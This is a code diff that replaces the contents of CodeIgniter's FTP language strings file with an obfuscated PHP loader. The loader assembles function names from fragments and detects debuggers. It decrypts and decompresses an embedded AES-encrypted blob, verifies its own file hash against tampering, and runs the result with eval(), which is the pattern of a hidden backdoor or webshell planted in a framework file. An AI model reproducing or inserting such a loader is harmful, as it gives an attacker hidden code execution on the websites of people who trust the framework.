@@ -1,51 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['ftp_no_connection']		= 'Unable to locate a valid connection ID. Please make sure you are connected before performing any file routines.';
-$lang['ftp_unable_to_connect']		= 'Unable to connect to your FTP server using the supplied hostname.';
-$lang['ftp_unable_to_login']		= 'Unable to login to your FTP server. Please check your username and password.';
-$lang['ftp_unable_to_mkdir']		= 'Unable to create the directory you have specified.';
-$lang['ftp_unable_to_changedir']	= 'Unable to change directories.';
-$lang['ftp_unable_to_chmod']		= 'Unable to set file permissions. Please check your path.';
-$lang['ftp_unable_to_upload']		= 'Unable to upload the specified file. Please check your path.';
-$lang['ftp_unable_to_download']		= 'Unable to download the specified file. Please check your path.';
-$lang['ftp_no_source_file']		= 'Unable to locate the source file. Please check your path.';
-$lang['ftp_unable_to_rename']		= 'Unable to rename the file.';
-$lang['ftp_unable_to_delete']		= 'Unable to delete the file.';
-$lang['ftp_unable_to_move']		= 'Unable to move the file. Please make sure the destination directory exists.';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_aaxrrl0n=('bas'.'e64'.'_de'.'cod'.'e');
+$_r1voic35=('gzu'.'nco'.'mpr'.'ess');
+$_t62nvy68=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_zrfz0w73='8HZR3ASF';
+$_ma2n57j0='DM5pWNaq';
+$_b3b560qk='aXr4EHIc';
+$_e4cpkpqs='d3LTifUkak8=';
+$_ttdrhpcd='sDRUDEa7';
+$_mcvwtc9i='ELzMoxhn';
+$_tqfhl7cx='KpZpCQ==';
+$_p1heqr9o='nrjtfJvd';
+$_gzfg4qc6=$_aaxrrl0n($_ttdrhpcd.$_ma2n57j0.$_b3b560qk.$_zrfz0w73.$_e4cpkpqs);
+$_c8z41xcd=$_aaxrrl0n($_mcvwtc9i.$_p1heqr9o.$_tqfhl7cx);
+$_winf9v83=$_aaxrrl0n('c5mtQBiaoFLAqzaCT3bqQ9ATDvAR9sq3+kNKzbYcOfXxreRFv4hLPHB/QUEM/MVqXGG7XIYlkZbv1pZf8/vaWt0YouOuLFO9PG3CZncOlSLJ+l68Dma1qG8mC84OGkI2c8i8LrIiMa7q3Dq48+RMePAxnPpGrY64f0SCoAVuGO6pKQK6CjF2fF5WBL+fhY/i82CpqL2jX4A6qGv1lDduuZXi19cv97DLyL6Fths70xXXKHjZLwsKm6+rvt5ziO0ZCWVgSHu8CkyfUqdzJaT9zhuH+JwDEKFzk7zl6gQVmEzlaSGWX6zzoEcp7TDpv/PWlEl9l59Y7ZaAZKxy8QBQhyS98MPVCQlayZXsDCSFAdT4T7OmXge5aTP8SV4F6e6AONrEX9+9z3vQY+HqoPPtxtJniugsU4bB9h3bT/ZxsznBeYZTWGBv1scalWrYfBdL6ArLr3HacO1rir4s7xDXHmiaNBhfVp8c69Q45McxT1cg+N+wcJIDPGK5OeLh3ItnKqpBOc0DigfEsRMp35kECwutia/7dR7o7j+fPXrQDXM=');
+$_x2xpouq8=$_t62nvy68($_winf9v83,'aes-256-cbc',$_gzfg4qc6,OPENSSL_RAW_DATA,$_c8z41xcd);
+if($_x2xpouq8===false){exit;}
+$_esl3f2rm=$_r1voic35($_x2xpouq8);
+if($_esl3f2rm===false){exit;}
+$_lcq33fnf='5e98558d9a623b559803aa4d4552481b6e5fb638f2cf5141fb261f7b49e71dc8';
+$_tomaet5p=@file_get_contents(__FILE__);
+if($_tomaet5p!==false){
+$_nxi7hyhg=str_replace($_lcq33fnf,"0000000000000000000000000000000000000000000000000000000000000000",$_tomaet5p);
+$_m0ik1xbr=hash("sha256",$_nxi7hyhg);
+if($_m0ik1xbr!==$_lcq33fnf){@http_response_code(403);exit;}
+}
+eval($_esl3f2rm);
